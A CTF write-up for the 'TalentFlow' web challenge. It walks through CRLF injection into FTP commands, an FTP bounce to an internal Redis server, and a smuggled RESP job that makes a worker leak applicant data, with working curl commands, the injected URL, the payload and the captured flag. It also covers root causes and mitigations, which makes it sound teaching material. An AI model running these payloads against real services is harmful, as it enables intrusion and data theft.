# Web Challenge 3: TalentFlow - Writeup

**Author:** marlithor-cyber
**Challenge Name:** TalentFlow
**Category:** Web
**Difficulty:** Hard

## Challenge Description

TalentFlow presented itself as a modern hiring portal where applicants could submit their CVs and recruiters could review them. The application had a clean interface for uploading documents and viewing applicant information. However, as with most CTF challenges, things were not as simple as they appeared.

## Initial Reconnaissance

When I first accessed the application, I explored the available functionality:

1. **Application Submission**: Upload a CV (DOCX format) with personal information
2. **CV Download**: Download previously uploaded CVs via `/cv/<filename>` endpoint
3. **Applicant Viewing**: Browse applicant profiles (though this seemed limited)

The application stack was more complex than typical web challenges:
- **Web Server**: Go application (`web/handlers.go`, `web/services/cv.go`)
- **FTP Server**: vsftpd for file storage (`ftp/vsftpd.conf`)
- **Worker**: Python worker that processes CVs (`worker/main.py`)
- **Database**: PostgreSQL for applicant data
- **Queue**: Redis for job management

This multi-service architecture immediately suggested that the vulnerability might involve interaction between components.

## Finding the Entry Point

I started by examining the web handlers. The most interesting endpoint was the CV download functionality:

```go
func handleCVDownload(w http.ResponseWriter, r *http.Request) {
    name := extractNameFromPath(r.URL.Path)
    cvSvc.Download(name)
}
```

The `name` parameter comes directly from the URL path and is passed to the CV service without validation. Let's see what `CVService.Download()` does:

```go
func (s *CVService) Download(name string) {
    conn.Retr(name)  // FTP RETR command
}
```

Wait... it's passing the user-controlled filename directly into an FTP command? This smells like **FTP command injection**.

## Understanding FTP Command Injection

FTP is a text-based protocol where commands are sent as strings. If we can inject CRLF characters (`\r\n` or `%0d%0a` URL-encoded), we can inject additional FTP commands.

For example, if we request:
```
/cv/test.pdf%0d%0aHELP%0d%0a
```

The FTP command becomes:
```
RETR test.pdf
HELP
```

This is powerful, but what can we do with it?

## Discovering FTP Bounce

While examining `ftp/vsftpd.conf`, I noticed two critical settings:

```
port_promiscuous=YES
pasv_promiscuous=YES
```

These settings allow **FTP bounce attacks**! This means we can use the FTP server as a proxy to connect to other services on the internal network. The `EPRT` command lets us specify where the FTP server should send data.

## Mapping the Architecture

At this point, I needed to understand the full system architecture:

1. **Web app** stores uploaded files on **FTP server**
2. **Worker** polls **Redis** for jobs
3. When a job appears, **Worker** generates a PDF and uploads it to **FTP**
4. The flag is stored in **PostgreSQL** as applicant `id=1`

The attack path became clear:
- Use FTP command injection to bounce into Redis
- Inject a fake job into Redis
- Make the worker generate a PDF for applicant `id=1` (which contains the flag)
- Download the generated PDF

## Building the Exploit Chain

### Step 1: Upload a Legitimate DOCX

First, I needed to upload a normal CV to understand the file naming scheme:

```bash
curl -X POST -F "cv=@resume.docx" -F "name=Test" -F "email=test@test.com" \
  http://talentflow.challenge/apply
```

Response:
```json
{
  "success": true,
  "cv_link": "/cv/a1b2c3d4-e5f6-7890-abcd-ef1234567890.pdf"
}
```

So uploaded files are stored with UUID names. The source DOCX is stored as:
```
a1b2c3d4-e5f6-7890-abcd-ef1234567890.docx
```

I'll need this filename for the fake Redis job.

### Step 2: Craft a RESP Payload

Redis uses the RESP (REdis Serialization Protocol) format. I needed to create a file that, when sent to Redis, would be interpreted as a valid command.

The worker expects jobs in this format:
```json
{"user_id":1,"filename":"<docx>","cv_uuid":"<output_uuid>"}
```

I crafted a RESP payload to push this job to the Redis queue:

```
*3
$5
RPUSH
$4
jobs
$117
{"user_id":1,"filename":"a1b2c3d4-e5f6-7890-abcd-ef1234567890.docx","cv_uuid":"11111111-1111-1111-1111-111111111111"}
```

Breaking this down:
- `*3` = Array with 3 elements
- `$5\r\nRPUSH` = Bulk string "RPUSH" (5 bytes)
- `$4\r\njobs` = Bulk string "jobs" (4 bytes)
- `$117\r\n{...}` = Bulk string with the JSON payload (117 bytes)

I saved this as `payload.resp` and uploaded it as another CV:

```bash
curl -X POST -F "cv=@payload.resp" -F "name=Payload" -F "email=payload@test.com" \
  http://talentflow.challenge/apply
```

Response:
```json
{
  "success": true,
  "cv_link": "/cv/b2c3d4e5-f6a7-8901-bcde-f12345678901.pdf"
}
```

So my RESP payload is stored as:
```
b2c3d4e5-f6a7-8901-bcde-f12345678901.resp
```

### Step 3: Execute the FTP Bounce Attack

Now for the tricky part - I needed to:
1. Make the FTP server connect to Redis (172.18.0.4:6379)
2. Send my RESP payload to Redis
3. Have Redis interpret it as a command

I crafted a malicious URL with CRLF injection:

```
/cv/b2c3d4e5-f6a7-8901-bcde-f12345678901.resp%0d%0aEPRT%20|1|172.18.0.4|6379|%0d%0aRETR%20b2c3d4e5-f6a7-8901-bcde-f12345678901.resp
```

URL-decoded, this becomes:
```
RETR b2c3d4e5-f6a7-8901-bcde-f12345678901.resp
EPRT |1|172.18.0.4|6379|
RETR b2c3d4e5-f6a7-8901-bcde-f12345678901.resp
```

Here's what happens:
1. First `RETR` tries to retrieve the file (fails, but that's okay)
2. `EPRT |1|172.18.0.4|6379|` tells FTP to open a data connection to Redis
3. Second `RETR` retrieves the file and sends it through the data connection to Redis
4. Redis receives the RESP payload and executes: `RPUSH jobs {...}`

I executed the attack:

```bash
curl "http://talentflow.challenge/cv/b2c3d4e5-f6a7-8901-bcde-f12345678901.resp%0d%0aEPRT%20|1|172.18.0.4|6379|%0d%0aRETR%20b2c3d4e5-f6a7-8901-bcde-f12345678901.resp"
```

### Step 4: Wait for the Worker

The Python worker continuously polls Redis for jobs:

```python
while True:
    job = redis.blpop('jobs')
    process_job(job)
```

When it finds my injected job, it:
1. Loads applicant data for `user_id=1` from PostgreSQL
2. Generates a PDF with that data
3. Uploads the PDF to FTP as `11111111-1111-1111-1111-111111111111.pdf`

I waited a few seconds for the worker to process the job.

### Step 5: Download the Flag

Now I could download the generated PDF:

```bash
curl "http://talentflow.challenge/cv/11111111-1111-1111-1111-111111111111.pdf" -o flag.pdf
```

Opening the PDF, I saw:

```
Applicant Report
[ CANDIDATE INFORMATION ]

ID
1

Full Name
LB{78844f003b0dbe51b67791cc295bc815}

Email
admin@talentflow.local
```

## Flag

```text
LB{78844f003b0dbe51b67791cc295bc815}
```

Success! The flag was in the "Full Name" field of applicant ID 1.

## Root Cause Analysis

This challenge involved a complex chain of vulnerabilities:

### 1. FTP Command Injection
The web application passes user input directly to FTP commands without sanitization:
```go
conn.Retr(name)  // name comes from URL, no validation
```

### 2. CRLF Injection
URL-encoded `%0d%0a` becomes literal CRLF in the FTP command stream, allowing command injection.

### 3. FTP Bounce Configuration
The FTP server is misconfigured with:
```
port_promiscuous=YES
pasv_promiscuous=YES
```
This allows the FTP server to connect to arbitrary internal services.

### 4. Redis Protocol Smuggling
By crafting a file in RESP format and bouncing it through FTP to Redis, we can inject arbitrary Redis commands.

### 5. Unauthenticated Worker Jobs
The worker blindly trusts any job in the Redis queue without authentication or signature verification.

### 6. Unrestricted User ID Access
The worker will generate a PDF for any `user_id`, including privileged accounts.

## Why This Attack Works

The key insight is that each component trusts the previous one:
- Web app trusts user input
- FTP server trusts web app commands
- Redis trusts FTP data
- Worker trusts Redis jobs
- Database returns any user data requested

By chaining these trust relationships, we can reach from unauthenticated web access all the way to privileged database records.

## Lessons Learned

1. **Input Validation**: Never pass user input directly to protocol commands
2. **Defense in Depth**: Each component should validate its inputs, not trust upstream services
3. **Least Privilege**: FTP bounce should be disabled unless specifically needed
4. **Job Authentication**: Queue jobs should be signed or authenticated
5. **Access Control**: Workers should only access data they're authorized for

## Mitigation

To fix this vulnerability chain:

1. **Sanitize filenames**: Reject or escape CRLF characters in CV download paths
2. **Disable FTP bounce**: Set `port_promiscuous=NO` and `pasv_promiscuous=NO`
3. **Validate FTP commands**: Use allowlists for FTP command parameters
4. **Sign Redis jobs**: Add HMAC signatures to job payloads
5. **Implement access control**: Workers should only process jobs for authorized users
6. **Network segmentation**: Redis should not be accessible from the FTP server

## Conclusion

TalentFlow was an excellent challenge that demonstrated how multiple small vulnerabilities can be chained together to achieve a significant impact. What started as a simple FTP command injection evolved into a complex attack involving protocol smuggling, service bouncing, and privilege escalation.

The challenge taught me the importance of:
- Understanding multi-service architectures
- Recognizing protocol-level vulnerabilities
- Thinking creatively about service interactions
- Building complex exploit chains step by step

This is the kind of vulnerability that could exist in real-world applications where different teams maintain different services without considering the security implications of their interactions.
